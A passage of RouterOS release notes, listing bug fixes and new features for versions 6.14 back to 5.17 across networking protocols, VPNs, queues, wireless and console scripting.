*) fixed upgrade from v5 - on first boot all the optional packages were disabled;
*) fixed problem where sntp server could not be specified in winbox & webfig;
*) metarouter - make openwrt work on ppc metarouter again;

What's new in 6.14 (2014-Jun-06 15:34):

*) sntp - 'mode' now is a read-only property, it is set to broadcast if no
    server ip address is specified;
*) smb - fixed some SMB1 errors;
*) wireless-fp package is now included in routeros one (disabled by default);
*) webfig - fixed quickset, it didn't work with disabled wireless pacakge;
*) sstp - fixed problem where session was closed every 2min;
*) pptp,l2tp,pppoe - fixed problem where some of the static bindings
   become dynamic interfaces;
*) eoip - lowered default MTU to avoid IP packet fragmentation;
*) eoip - added clamp-tcp-mss setting with default=yes for new tunnels to avoid
   IP packet fragmentation;
*) fixed - bridge could sometimes get added without "running" flag;
*) fixed - simple queues could sometimes crash router;
*) fixed - simple queue stats freeze (empty winbox queue window);
*) ssh server - allow none cipher;
*) proxy - added 'anonymous' option which will skip adding X-* and Via headers;
*) dhcp server - added option use-framed-as-classless and
    added support for DHCP-Classless-Static-Route RADIUS attribute;
*) quickset - fixed problem where address mode selection did not work in
	bridge mode;
*) ipv6 address - fixed problem where changing advertise lost ipv6 connected route;

CAVEAT: CAPsMAN Layer3 doesnтАЩt work if IPv6 package enabled either
	on CAPsMAN or CAP device;


What's new in 6.13 (2014-May-15 16:03):

*) console - comments are now accepted where new command can start, that is,
    where '/' or ':' characters can be used to start new command, e.g.
	/interface { # comment until the end of the line
	    print
	}
*) backup - backups by default are encrypted now (with user password).
   To use backup on older versions, you should disable encryption with dont-encrypt
   flag when creating it;
*) files with '.sensitive.' in the filename require 'sensitive'
    permission to manipulate;
*) lcd - reduce CPU usage when displaying static screens;
*) l2tp - fixed occasional server lockup;
*) pptp - fixed memory leak;
*) sstp - fixed crashes;

What's new in 6.12 (2014-Apr-14 09:27):

*) l2tp - fixed "no buffer space available" problem;
*) ipsec - support IPv4 over IPv6 and vice versa;
*) pppoe - report correctly number of active links;
*) updated timezone information;
*) many fixes for CRS managed switch functionality -
   particularly improved VLAN support, port isolation, defaults;
*) added trunk support for CRS switches;
*) added policing support for CRS switches;
*) www - added support for HTTP byte ranges;
*) lte - provide signal strength using snmp and make 'info once' work in console;

What's new in 6.11 (2014-Mar-20 09:16):

*) ipsec - fix aes-cbc hardware acceleration on CCR with key sizes 192 and 256;
*) wireless - add auto frequency feature;
*) ovpn - fixed TLS renegotiation;
*) ovpn - make bridge mode work with big packets (do not leave extraneous padding);
*) ovpn - fixed require-client-certifcate;
*) ppp - revert RADIUS NAS-Port behaviour, report tunnel interface id;
*) ppp - mppe encryption together with mrru locked the router;
*) dhcp - added support for DHCP option 138 - list of CAPWAP IPv4 servers;
*) quickset - added Guest Network setup to Home AP mode;
*) console - no longer required to supply value of '/routing bgp instance vrf'
    property 'instance' for 'add' command;
*) ethernet - added option to enable rx/tx flow control
    (will be disabled by default);
*) ethernet - added ability to specify advertised modes for copper ports;
*) fixed 100% cpu usage on CCRs;
*) ssl - not finding CRL in local store for any certificate in trust chain will cause connection to fail;
*) lte - support for Huawei ME609 and ME909u-521;

What's new in 6.10 (2014-Feb-12 13:46):

*) fix autosupout.rif generation after kernel panic;
*) ovpn - make it work again;
*) ovpn client - remove cipher=any & auth=any options,
   protocol does not support them;
*) pptp - fixed where Windows & MacOS clients were disconnecting all the time;
*) sstp - make it work with Windows client with AES encryption;
*) ipv6 pool - fix dynamic prefix disappearing which may influence large
    VPNs with IPv6;
*) ssh client - fix key agreement when sometimes wrong DH algorithm was selected;
*) bgp - multipath eBGP now does not propagate BGP nexthop unless
    forced in configuration;
*) removed 10/100 half duplex from autonegotiation advertisement on CCR;

What's new in 6.9 (2014-Jan-31 11:18):

*) lcd - added option to change the color-scheme;
*) updated bootloader firmware;
*) ppp: fixed RADIUS accounting;
*) ppp: fixed IPV6-Prefix assigning;
*) ppp: fixed dial-on-demand;

What's new in 6.8 (2014-Jan-29 15:52):

*) bridge - default protocol-mode changed to RSTP for new bridges,
   fixed bridge mac address changing when port (with lowest mac address) goes down
*) userman - improve startup time;
*) sstp client - support server name verification from certificate;
*) wireless - improved 11n and nv2 stability;
*) dhcp client - support interfaces in bridge;
*) dhcp - parse decimal strings and IP addreses in options value;
*) bgp - don't show community 'internet' in BGP advertisements;
*) ipsec - enable hardware acceleration for aes-cbc + md5|sha1|sha256 aead on CCR;
*) ospf - fixed checksum calculation for OSPFv3 AS-external-LSAs;
*) default configuration - changed dhcp server lease time to 10 minutes;
*) fixed port isolation on CRSs (bug introduced in v6.6);
*) smb - added support for SMB 2.002
*) timezone information updated;
*) ppp - fixed ppp bridging (did not work since v6.6);
*) improved speed of PPP, PPPoE, PPTP & L2TP on multicore routers;
*) address-list - fix crash when adding two identical address list entries;
*) fixed multicast forwarding on CCRs;
*) firewall - improved address-type matcher, and added it for ipv6 aswell;
*) kernel drivers for ppp, pppoe, pptp, l2tp are now lock-less on transmit & receive;
*) all ppp packets (except discovery packets) now can be handled by multiple cores;
*) MPPE driver now can handle up to 256 out-of-order packets;

What's new in 6.7 (2013-Nov-29 13:37):

*) support Android usb tethering interface;
*) ipsec - added aes-gcm icv16 encryption mode;
*) wireless - improve rate selection for nstreme protocol
*) poe - new poe controller firmware for RB750UP and OmniTIK UPA;
*) ipsec - added aes-ctr encryption mode;
*) leds - inverted modem signal trigger, now it will trigger when the signal
    level rises above the treshold;
*) ipsec - added sha256 and sha512 support;
*) ipsec - proposal defaults changed to aes-128 and sha1 for both phase1 and phase2;
*) certificate - support ip, dns and email subject alternative names;
*) dhcpv4 server - added REMOTE_ID option variable for relayed packets;
*) ipsec - fix policy bypass on IPv6 gre, ipip, eoip tunnels when policy
    uses protocol filter;
*) userman - fix crash on tilera;
*) fixed hairpin nat on bridge with use-ip-firewall=yes;
*) fixed vlan on bridge after reboot having 00:00:00:00:00:00 mac address;
*) address-list - allow manually adding timeoutable entries;
*) address-list - show dynamic entry timeout;
*) fixed l2mtu changing on CCRs - could cause port flapping;
*) disabling/enabling ethernet ports did not work properly on CCRs,
   could cause port flapping;
*) fixed port flapping on CCR - could happen when having other than
    only-hardware-queue interface queue.
    Note that having other interface queue than only-hardware-queue
    dramatically reduces performace, so should be avoided if possible;


What's new in 6.6 (2013-Nov-07 13:04):

*) winbox - fixed problem where all previous session opened windows were read only;
*) certificate - no more 'reset-certificate-cache' and 'decrypt' commands,
    private keys can be decrypted only on 'import', use 'decrypt'
    before upgrade if needed;
*) fixed arp-reply only with more than one ip address on interface;
*) fixed RB400 not to reboot by watchdog during micro-sd format;
*) web proxy - fix SPDY server push handling;
*) certificate - merged '/certificate ca issued', '/certificate scep client' and
   '/certificate templates' into '/certificate';
*) console - :foreach command can iterate over keys and values in an array,
    by specifying two counter variables, e.g.:
    :foreach k,v in=[/system clock get] do={:put "$k is $v"};
*) added support for new Intel 10Gb ethernet cards (82599);
*) certificates - fixed certificate import;
*) wireless - fixed crash when dfs was enabled on pre-n wireless cards;
*) fixed port flapping on CCR;

What's new in 6.5 (2013-Oct-16 15:32):

*) tftp - added data packet pipelining for read requests;
*) console - exported physical interface configuration uses 'default-name'
    instead of item number to match relevant interface;
*) console - report all constituent errors for parameters with multiple
   alternative value types;
*) certificates - merge '/certificate ca' into '/certificate',
    use set-ca-passphrase to maintain CA functionality;
*) lcd - backlight option is replaced with "/lcd backlight" command
*) dhcp server - added option to disable conflict-detection;
*) console - ':return' does not trigger 'on-error=' action of ':do' command;
*) route - fixed crash that could be triggered by change in nexthop
    address resolution;
*) route - some imported VPNv4 routes were not using MPLS labels;
*) route - imported VPNv4 routes were not always updated or removed when
    the original route changed;
*) winbox - fixed problem where all settings were read only on first open;
*) ovpn server - use only ciphers that are allowed not that client requested;
*) ssh client - fixed public key authentication;
*) ipsec - fix peer mathing with non byte aligned masks;
*) fix routerboot upgrading if RouterOS is partitioned;
*) add support for second serial port on CCR boards;
*) fix serial port baudrate selection on CCR boards;
*) ethernet interface stats that are behind switch chip
    show real hw stats instead of just the traffic that goes through cpu;

What's new in 6.4 (2013-Sep-12 13:52):

*) wireless - improved 802.11n wireless retransmission (doesn't effect nstreme/nv2)
*) ovpn - allow to specify server via dns name;
*) winbox - fixed problem where ipv6 routes with non local link address gateway
   could not be added;
*) fixed watchdog on mipsle boards;
*) traceroute - added count & max-hops parameters;
*) traceroute - added back use-dns parameter;
*) fixed usb Yota LTE modem hangup;
*) console - make newly added item names always immediately available;
*) graphing - make sure that interface graphs gets preserved across reboots;

What's new in 6.3 (2013-Sep-03 12:25):

*) ssh - fixed denial of service;
*) traceroute - show mpls labels as well;
*) bug fix - sometimes some new interfaces could not be created properly any more (f.e. some pppoe clients could not connect);
*) console - added '/console clear-history' command that clears command-line
    history for all users, requires 'policy' policy;
*) sstp - limit packet queue for each device;
*) RB2011L - fixed occasional gigabit switch-chip lockup;
*) user manager - will warn on 1MB and stop before reaching minimum of 500KB disk space;
*) hotspot - do not account traffic to local hotspot pages;
*) ppp, hotspot - added ability to specify where to insert rate limiting queue,
   it's parent and type;
*) pptp, l2tp, sstp - allow to specify server via dns name;
*) dhcp - added ability to specify where to insert rate limiting queue;
*) www proxy - support ipv6 parent proxy;
*) webfig - fixed problem when opening quickset page country
    was automaticly changed to etsi;
*) traceroute - added mtr like pinging;
*) fix queues - correct queue was not installed when last child removed;
*) fix simple queues - sometimes some simple queues would stop
   working after configuration changes;
*) console - fixed issue with local variables having non-empty value
    before first assignment;
*) console - fixed command ":global name" without second argument to not
    create or change global variable "name", only effect is to make "name"
    refer to global variable.
*) console - fixed passing local variables as argument to function;
*) RB1200 - fixed crash when receiving over l2mtu size packets
   on some ethernet interfaces;

What's new in 6.2 (2013-Aug-02 10:37):

*) console - added "on-error" argument to ':do' command that is executed
    if command raises error;
*) hotspot - fixed chap error after failed http-chap login (broken in v6.1);
*) console - added new ':return' command that interrupts execution of script
    and passes argument as return value if script was called as function;
*) routerboot - fixed upgrade from RouterOS (could fail on some units);
*) userman - fixed payment gateway response notify processing;
*) console - resolved issue with 'from-pool' propery in '/ipv6 address';
*) console - array value syntax in expressions '{1;2;3;4}' now can
    specify values with word keys as '{a=1;b=2}';
*) console - added 'verbose' argument to '/import' command that enables
    line-by-line script import. By default import whole script at once
    and don't print it, as it was in version 6.0;
*) console - ':global', ':local' and ':set' commands have new parameter 'do'
    that allows assigning block of commands to the variable;
*) console - global variables now are common to all users and are
    available to all users with at least "read,write,test,policy" policy;
*) console - fixed parameter passing to scripts. Script parameters can
    be accessed without declaring them with ':local' and ':global' commands.
    For backwards compatibility global variables are first looked up in
    script parametrs;
*) console - '$var 1 2 a="a" b="b"' syntax for passing parameters to commands
    stored in a variable. Parameters are accessed as '$1' '$2' '$a' '$b';
*) ipsec - fixed peer address matching;
*) ups - query smart ups capabilities before issuing any commands;
*) improved CCR responsiveness on other interfaces when one interface is under attack;
*) sms tool - added sim-pin setting;
*) dhcp server - framed routes are now also added to the server routing table;
*) dhcpv6 server - added binding-script option;
*) proxy - allow multiple src-address for ipv4 and ipv6;
*) eoip,gre tunnels could occasionally crash multicore router;
*) fixed bug - sometimes some types of interfaces would stop working;
*) ipsec sometimes could crash kernel on CCR;
*) connection tracking sometimes could crash kernel on CCR;
*) ppp,pptp,l2tp,sstp - added default-route-distance parameter;
*) scep - "/cert scep ra" merged into "/cert scep client" without saving ra config;
*) ipsec - fix phase1 autonegotiation on little endian platforms;
*) pppoe server - allow service with empty service-name to accept all pppoe clients;
*) lcd - current-screen option is replaced with "/lcd show" command
*) lcd - current-interface option is replaced with "/lcd interface display" command
*) graphing - make graphs stable on ppp & ovpn interfaces;
*) www, hotspot - fixed problem when www service stopped responding on high load;
*) winbox, webfig: allow to enter space in the text fields;
*) webfig - fixed configuration of VPLS & routing filters;
*) lcd - added option for enabling or disabling the touch screen;
*) lcd - added options for screen switching;
*) lcd - up to 10 non-physical interfaces can now be added to the lcd;
*) lcd - all interface graph screen can now be customized from /lcd interface page;
*) backup - changed default backup file name to <id>-<YY><MM><DD>-<HHMM>.backup
   for file browsers to sort them properly;
*) webfig - it did not work in Opera;
*) webfig - made terminal work again;
*) winbox - added ability to fully set up traffic generator in winbox;
*) trafficgen - allow ranges for ip addrs and udp ports;
*) trafficgen - add tcp header support;
*) queue simple - fixed bug - actual queue order sometimes was wrong;
*) queue simple - queue is not invalid when at least one of target interfaces is up;
*) fixed crash when setting master-port on AR8327 switch chips;
*) fixed addresslist - dynamic entries sometimes would still
   show up even afther being timed out;
*) added /ip settings allow-hw-fast-path setting to control AR8327N hardware ipv4 fast path;
*) vrrp - allow more than one vrrp on interface;

What's new in 6.1 (2013-Jun-12 11:50):

*) pptp, l2tp - fixed crash when tunnel mru was too big and fragmented ip packet
   was received;
*) hotspot - fixed problem when after upgrade hotspot html directory was empty;
*) ipv6 nd - dns dynamic-servers were not included in router advertisements;
*) winbox - fixed problem Switch menu disappeared on RB2011;
*) fixed memory amount issue on RB1100AHx2;
*) console - '/import' prints each command that is executed;
*) console - 'import' has new argument 'from-line' that starts executing
    commands after specified line;
*) secure api - fixed problem when wrong client ip address was reported;
*) hotspot - fixed universal client;
*) api - added support for API over TLS (SSL);
*) api - api service is now enabled by default;
*) ppp - do not show R flag for locally authenticated users;
*) vrrp - fixed ah authentication;
*) webfig - added support for RADIUS authentication (via MS-CHAPv2);
*) ipsec - for peers with full IP address specified system will
   autostart ISAKMP SA negotiation;
*) trafficgen - added inject-pcap command for replaying pcap files into network;
*) dns - retry queries with tcp if truncated results received;
*) improved queue statistics updating;
*) fix 1G linking with some Cisco devices (affects RB7xx, RB9xx, RB1100, RB2011, CCR);

What's new in 6.0 (2013-May-17 14:04):

*) ipsec - added /peer passive option which will prevent starting ISAKMP negotiation
    and signifies xauth responder/initiator side;
*) RouterBOARD - default wireless config now includes password - serial number;
*) lte - support YOTA WLTUBA-107;
*) console - fixed crash when variable name was not specified for
    ':global', ':local', ':set', ':for' and ':foreach' commands;
*) hotspot - added mac-cookie login method;
   http://wiki.mikrotik.com/wiki/Manual:Hotspot_Introduction#MAC_Cookie
*) lcd - show a message when system shutdown is complete;
*) lcd - added Log screen which is accessible through the Main Menu
   and shows log messages where action=echo;
*) ipsec - added pre-shared-key-xauth and rsa-signature-hybrid
   authentication methods;
*) increased max l2mtu on CCR to 10226 bytes;
*) fixed crash on RB1200;
*) fixed bonding - did not work after remove, undo;
*) fixed queues - router could become unresponsive when configuring queues;

What's new in 6.0rc14 (2013-Apr-24 11:52):

*) route - make connected routes inactive when interface has no link;
*) ipsec - changing or removing unused peer or proposal config won't
   flush active SAs;
*) console - add 'without-paging' to more 'print' commands;
*) route - automatically repair FIB inconsistencies;
*) ipsec mode-cfg - unity split include support;
*) ipsec policy - template matching for policy generation;
*) metarouter: fixed occasional lockups on mipsbe boards;
*) fixed crash when bridge filter rule had action=return for rule in builtin chain;
*) traffic-flow - fixed deadlock and crash on multicore;
*) fixed memory leak on CCR with PPPoE interfaces;
*) improved PPPoE interface encapsulation performance;
*) fixed queues - total amount of traffic passing through queues sometimes was
   about 1Gbit;

What's new in 6.0rc13 (2013-Apr-08 14:25):

*) pppoe, l2tp, pptp server - increased lcp retransmit count to 10;
*) pptp, l2tp & pppoe clients - added ability to specify keepalive timeout;
*) graphing - fixed problem were interface graphs are lost on reboot;
*) dhcpv6 - added relay;
*) sstp server - restore (disabled in rc12) test mode which allows
    running server without certificate;
*) lcd - added option for turning backlight on/off;
*) bgp - fix med comparison check if routes are received from iBGP peer;
*) fixed simple queues - sometimes some simple queues did not limit traffic
   (bug introduced in 6.0rc12);
*) allow to change arp timeout (in /ip settings);
*) added /ip neighbor discovery settings setting "default-for-dynamic" to control
   discovery on new dynamic interfaces (off by default);

What's new in 6.0rc12 (2013-Mar-26 17:18):

*) ospf - add use-dn option;
*) ospf - fix route-tag handling;
*) fixed layer7 matcher - it is case insensitive now;
*) remote logging - added iso8601 time format support;
*) bgp - change MED propagation logic, now discarded when sending route with
    non-empty AS_PATH to an external peer;
*) fixed occasional nand corruption on CCR;
*) ipsec - added ipv4 mode-cfg support for responder;
*) ipsec - fixed some issues with removal of dynamic policies;
*) email - renamed parameter tls to start-tls for send command;
*) wireless - update required when using small width channel RB2011 RB9xx
    caveat: update remote end/s before updating AP as both side are
	   required to use new/same version for a link
*) ipsec - generate-policy now can have port-strict value which will use port
   from peer's proposal when generating policy or port-override which
   will always generate policy for any port;
*) ipsec - responder side now uses initiator exchange type for peer
   config selection;
*) lcd - changed All interface stat screen (bar graphs) to show total
   bandwidth usage, combine rx/tx together;
*) lcd - removed "all-interface-mode" option;
*) lcd - changed "Interfaces" screen to show interface usage
   similiar to All interface stat screen;
*) lcd - improved Interfaces -> * -> Info screen, added more wireless information;
*) lcd - added Registration Table screen for wireless interfaces under
    Interfaces -> 'wireless interface' -> Registration Table;
*) fixed occasional kernel crashes on CCR;
*) fixed other than only-hardware-queue interface queues on CCR;
*) lte - devices with vendor/product id pair 0x0f3d/0x68AA now
   uses directip inferface;
*) dhcp client v4 - option add-default-route now supports special-classless value;
*) significantly increased simple queue performance on multi core systems
   (up to 9x on CCR1036 with at least 32 top level simple queues);
*) ip arp - new property published;
*) web proxy - added new option max-cache-object-size,
   upper limit of max-client-connections and max-server-connections
   is now calculated from system RAM;
*) ospf - fixed inconsistency in external ECMP route calculation;
*) certificates - CA keys are no more cached, every CA operations
   now requires a valid CA passphrase.
   use set-ca-passphrase for scep server to cache CA key in encrypted form;
*) ppp - made MPPE encryption work on tilera (bug introduced in 6.0rc10);
*) tool fetch - https support with optional certificate verification;
*) sstp server - removed test mode which allowed running server without certificate;
*) trafficgen - add support for ipv6 header;
*) wireless - added support for small channels on SXT lite;

What's new in 6.0rc11 (2013-Feb-22 09:17):

*) ppp - made MPPE encryption work on tilera (bug introduced in 6.0rc10);
*) sstp server - added option to force AES encryption;
*) fixed router crash on heavy traffic with sierra lte
   modem on boards with 32MB RAM;

What's new in 6.0rc10 (2013-Feb-15 10:47):

*) ppp - added bridge-path-cost & bridge-port-priority to ppp profiles;
*) ppp - made RSTP work over ppp links as well;
*) ppp - added last-logged-out to ppp secrets;
*) ppp - made MRRU work propererly on CCR;
*) hotspot, ppp - support multiple address-lists;
*) fixed problem - could not format disks larger than 2Gb on CCR;
*) fixed problem - repartitioning flash second time made system unbootable;
*) fixed problem - partition fall back settings got corrupted;
*) fixed problem - package made for other architectures could be installed,
   making whole system non functioning;
*) sstp, ipsec - respect CRLs;
*) certificates - for certificates marked as trusted=yes,
    CRL will be automaticly updated once in hour from http sources;
*) fixed ppp family interfaces - show it's status (bug introduced in rc8);
*) fixed p2p, connection-bytes firewall matcher;
*) fixed ip firewall nat action=same;

What's new in 6.0rc9 (2013-Feb-08 08:15):

*) ospf - fixed Summary-LSA prefix length check for OSPFv3, was not
    accepting valid LSAs;
*) certificates - fix broken certificate handling
   (bug introduced in rc8) in all related programs;
*) fixed - bgp tcp-md5-key crash on CCR;
*) fixed interfaces list sometimes showing up empty;
*) fixed - ip addrs could be inactive for some types of interfaces
   which are added as bridge ports and disabled;

What's new in 6.0rc8 (2013-Feb-04 13:25):

*) ppp,pppoe,pptp,l2tp,sstp - only 2 change mss mangle rules are
   created for all ppp interfaces;
*) wireless - fixed AES encryption speed issues (upgrade suggested);
*) dhcpv6 server - handle info requests;
*) webfig - compressed all html resource files, speeds up opening of webfig page;
*) console - reduced width of address column in '/user print';
*) simple queues requires target arg to be specified when adding;
*) do not count packets for unknown protocols as rx_dropped;
*) snmp - provide POE info;
*) improved cpu usage reporting on CCR boards;
*) improved interface reading performance;
*) changed CLI interface order - first are ethernets,
   second wireless, third everything else.
   Within group interfaces are ordered by name;
*) interfaces are deleted much faster, could be bottleneck on
   systems with many ppp sessions;
*) pptp,l2tp,6to4 tunnel encapsulation/decapsulation now resets packet marks to
   have consistent behavior across tunnels;
*) fix simple queue interface matching when doing encapsulation in some tunnel,
   could result in double accounted packets;
*) ip/ipv6 firewall has all-ether,all-wireless,all-vlan,all-ppp interface matchers
*) queue limits could be inaccurate for large limits (100M or more);

What's new in 6.0rc7 (2013-Jan-18 13:04):

*) dhcp relay - possibility to add relay agent information option;
*) lcd - options current-interface, time-interval and all-interface-mode
    no longer get reset after reboot;
*) fix reboot in virtualized enviroment;
*) lcd - improve slideshow screen;
*) console - file print now shows file size as small number with suffix;
*) dhcp v4 - fix problem when sometimes client or server failed to send packets
    most likely it happened on vlan interfaces;
*) ipv6 - added setting to disable forwarding;
*) added "/ip neighbor discovery settings" menu with "default=yes/no" setting;

What's new in 6.0rc6 (2012-Dec-21 12:20):

*) fixed problem - netinstall for x86 did not work;
*) lcd - added take-screenshot command;
*) lcd - fixed calibration, fresh boards no longer require recalibration;
*) optimize memory usage - makes 32Mb routerboards more stable;
*) support BandRich modems with newer firmware;
*) ipsec - authentication using certificate store but without CRL checking for now;
*) added feature - flash can be partitioned on routerboards and
   separate versions can be installed on each of them (requires latest firmware);
*) fixed problem - after restoring backup, it gets restored again on every reboot;
*) improved router performance when dhcp client/server present in system;
*) fixed vlan on bond after reboot;
*) fixed occasional queue kernel crash;

What's new in 6.0rc5 (2012-Dec-05 15:22):

*) wireless - advanced rate selection is the only method supported;
*) ssh client - support keyboard-interactive authentication;
*) fix simple queue config upgrade;

What's new in 6.0rc4 (2012-Nov-28 17:16):

*) dhcp server - added two radius string options (24, 25)
   for use in custom dhcp options;
*) fixed problem - ppp dial-on-demand did not work, it allways dialed in;
*) fixed problem - password was not saved when adding new user;
*) added feature - show last-logged-in in users list;
*) snmp - fix interface table;
*) dhcp ipv6 - added comment fields;
*) dhcp client ipv6 - add/remove default route or ntp server
   without renew when settings change;
*) ppp clients - set up dns dynamic-servers instead of static ones;
*) fixed problem - Connect button did not work in wireless scanner;
*) dhcp server - added radius framed route support;
*) fixed problem - MetaROUTERs did not work
   on PowerPC boards (RB800, RB1000, RB1100);
*) fixed problem - check-for-updates stopped working if it didn't find new updates
   previously;
*) dhcp ipv6 - added dns option support;
*) gre - support all protocol encapsulation, not just ip and ipv6;

What's new in 6.0rc3 (2012-Nov-09 12:59):

*) fixed problem - MetaROUTERs did not work on RB2011s;
*) fixed problem - Realtek 1Gbit ethernet cards did not work;
*) added "/ip settings" menu with following settings:
   ip-forward, send-redirects, accept-source-route, accept-redirects,
   secure-redirects, rp-filter, tcp-syncookies;
*) fix some ipv6 firewall matchers;
*) improved performance for eoip,eoipv6,gre,gre6 tunnels, especially on multi core;
*) /queue tree entries with parent=global are performed
   separately from /queue simple and before /queue simple;
*) snmp - fixed missing OIDs;

What's new in 6.0rc2 (2012-Oct-24 11:27):

*) added generic fast path support on certain interfaces
   (all ethernets on RB3xx, RB6xx, RB7xx, RB8xx, RB9xx, RB1000, RB11xx, RB2011);
*) added ipv4 fast path, it doubles ipv4 forwarding performance
   on supported interfaces when no firewall, conntrack, queues.
*) added traffic generator fast path;
*) addedbridge fast path;
   More info on fast path: http://wiki.mikrotik.com/wiki/Manual:Fast_Path

What's new in 6.0rc1 (2012-Sep-26 14:56):

*) i386 - increased number of supported cores to 64;
*) userman - fix unpaid profile activation while authenticating;
*) dhcp client - custom options;
*) dhcp options - allow mixing different data types;
*) console - "export compact" now is the default, use "export verbose" to get
     previous behaviour;
*) ntp - make it work again;
*) tftpd - if real-file is a existing directory then prefix request with it;
*) RB333 ethernets are back;
*) dns - rotate servers only on failure;
*) fix M3P (/ip packing);

What's new in 6.0beta3 (2012-Aug-22 12:12):

*) installation - use much less space in storage (works well with 32MiB flash);
*) routerboard package is now merged with system package;
*) userman - use corresponding time zone data when showing date in console;
*) gps - init-string option;
*) ipsec - kill phase1 if ipsec-sa in responder expires due to system time change;
*) ipsec - rekey phase1 before expiration;
*) ipsec - when last ISAKMP-SA is deleted for the remote host
   remove related IPSec-SAs;
*) ipsec - send delete IPSec-SAs on shutdown/reboot;
*) user manager - fix user's active profile end time if it has unlimited validity,
    these users now won't be hidden from reports when date filters are in effect;
*) certificate validity is shown using local timezone offset;
*) fixed queue bit rate reporting;
*) fixed ipv6 firewall;
*) upgraded drivers and kernel (to linux-3.3.5);
*) added priority matcher to firewall;
*) added change-dscp from-priority and from-priority-to-high-3-bits options;
*) fixed router crash or hang when rebooting;
*) add snif-tzsp,snif-pc actions to ip/ipv6 firewall mangle;
*) traffic-generator improvements for multi core;

What's new in 6.0beta2 (2012-Apr-24 10:57):

*) "/ip address set" and "/ipv6 address set" commands did not work properly;
*) fix eoipv6 tunnels, tunnel-ids in packets were shuffled;
*) fix dynamic simple queues;
*) fix /ipv6 firewall connection-state matcher, was crashing router;
*) fix traffic generator, was crashing router when generating traffic
   on bonding interface;
*) fix wds interfaces;
*) downgrading to v5 was losing wireless interface configuration;
*) fix queue byte and rate statistics;
*) fix ethernet port order on all boards;

What's new in 6.0beta1 (2012-Apr-13 15:26):

*) updated drivers and kernel (to linux-2.6.38.2);
*) improved interface management
   (scales well for up to thousands of interfaces and more);
*) improved queue management (/queue simple and /queue tree) - easily handles tens
   of thousands of queues;
*) improved overall router performance when simple queues are used -
   at least double the performance of v5,
   even bigger improvements on multicore systems;
*) very small overhead for packets that miss simple queues,
   but simple queues are present in the system;
*) pcq queue is NAT aware (just like "/queue simple" and "/ip traffic-flow";
*) in "/ip firewall mangle" can specify "new-priority=from-dscp-high-3-bits";
*) new default queue types: pcq-download-default and pcq-upload-default;
*) simple queues have separate priority setting for download/upload/total;
*) slave flag shows up for interfaces that are in bridge,bonding or switch group;
*) global-in, global-out, global-total parent in /queue tree is
   replaced with global that is equivalent to global-total in v5;
*) simple queues happen in different place - at the very end of
   postrouting and local-in chains;
*) simple queues target-addresses and interface parameters are joined into one
   target parameter, now supports multiple interfaces match for one queue;
*) simple queues dst-address parameter is changed to dst and now supports
   destination interface matching;
*) dns cache logs requests to topics "dns" and "packet";

What's new in 5.26 (2013-Sep-04 15:01):

*) ssh - fixed denial of service;

What's new in 5.25 (2013-Apr-25 15:59):

*) web proxy - speed up startup;
*) metarouter - fixed occasional lockups on mipsbe boards;
*) wireless - update required when using small width channel RB2011 RB9xx
    caveat: update remote end/s before updating AP as both side are required to use new/same version for a link 

What's new in 5.25 (2013-Apr-25 15:59):

*) web proxy - speed up startup;
*) metarouter - fixed occasional lockups on mipsbe boards;
*) wireless - update required when using small width channel RB2011 RB9xx
caveat: update remote end/s before updating AP as both side are required to use new/same version for a link

What's new in 5.24 (2013-Feb-19 15:29):

*) l2tp - fixed problem with reconnects when it added multiple ip addresses;
*) wireless - fixed AES encryption speed issues (upgrade suggested);

What's new in 5.23 (2013-Jan-29 14:07):

*) lcd - changed gamma, which gives greater contrast
*) fix reboot when running on third party hypervisors;
*) ppp client - fixed possible loss of configuration after reboot for some modems;
*) fixed wifi led order on "SXT Lite5";

What's new in 5.22 (2012-Nov-23 09:28):

*) userman - fix PayPal "bad HTTP response";
*) kvm - fixed possible ROS guest incomplete package installation;
*) l2tp server - added keepalive-timeout setting;
*) wireless - fixed RADIUS mac-caching;
*) wireless - fixed rare nv2 link stall;
*) metarouter - fixed system occasional lockup for 12s on RB4xx and RB7xx;
*) metarouter - fixed crash when FPU exception was raised in one of powerpc metarouters;
*) quickset - added HomeAP mode;
*) fixed "export compact" in "ip proxy";

What's new in 5.21 (2012-Oct-12 08:25):

*) route - fix dst-prefix filtering did not return routes when routes with
    different routing-mark were present;
*) wireless - improved nv2 stability;
*) winbox & webfig - added simple new version downloading & upgrading panel;
*) dhcp server - immediately store to disk changes for lease configuration;
*) lcd - improve graphs screen
*) lcd - improve touch screen (must /lcd reset-calibration)
*) smb - fix smb share mounting on linux systems
*) ovpn - fixed memory leak on disconnects;
*) userman - fix unpaid profile activation while authenticating;
*) sstp - fix high CPU usage on SSL handshake;
*) winbox - added ability to add time & date to dashboard;
*) metarouter - fixed lockups on RB110AH;
*) metarouter - fixed occasional lockups on RB450G;
*) ups - fixed problem connecting to USB device, introduced in 5.20;
*) quickset - added Wireless PTP Bridge mode;
*) fix MPLS MTU configuration usage;
*) dns - fix empty response;

What's new in 5.20 (2012-Aug-15 13:04):

*) manual upgrade to NEW beta poe controller firmware v2.0 for RB750UP and OmniTIK UPA;
   more info at http://wiki.mikrotik.com/wiki/Manual:PoE-Out
*) fix RB951-2n wireless issues;
*) ups - fixed resource leak;

What's new in 5.19 (2012-Jul-16 10:51):

*) ssh - added /ip ssh regenerate-host-key which will regenerate current host key;
*) dhcpv6 client - fix multiple advertise handling;
*) snmp - fix v3 engineID discovery;
*) fix ticking sound on RB411UAHL;
*) user manager - fixed byte to KiB, MiB and GiB conversion
  (digit after decimal point was incorectly calculated);
*) fix routerboard firmware upgrade on RB951-2n;
*) sniffer/torch + simple queues sometimes could crash router;

What's new in 5.18 (2012-Jun-21 17:20):

*) fixed upgrade problem when it failed with error "disk is too small" while
   there was plenty of space left;
*) fix health and poe access reliability on OmniTIK UPA and RB750UP boards;
*) sstp - improve initial handshake to better handle many new connections;
*) wireless - do not use bridge and WDS mode on AP-AP links, causes loops;
*) dhcp ipv6 pd client - fixed ipv6 pool creation after reboot;
*) dhcp ipv6 pd client - added option add-default-route;
*) sstp - fixed connection idle time reporting;
*) fix bad block count not to increase on Samsung K9F1208U0C nand;
*) snmp - fix dhcp lease table, snmp reported an incorrect information
    when a static lease had configured different address than current active address,
    this should also solve problem with dude polling same leases over and over again;
*) fix RB1100 crash on interface disable/l2mtu change/reboot;
*) dns could not resolve some domain names, was ignoring replies with DNAME RRs;
*) fix firewall log action - sometimes was not logging mac addr;

What's new in 5.17 (2012-May-28 12:34):

*) files - fixed problem when directories disappeared after reboot on usb or sd flash;
*) webfig - make QuickSet scan list work in Firefox v12;
*) webfig - fixed problem in QuickSet when changing country or channel-width in AP
   mode would enable NV2 protocol;
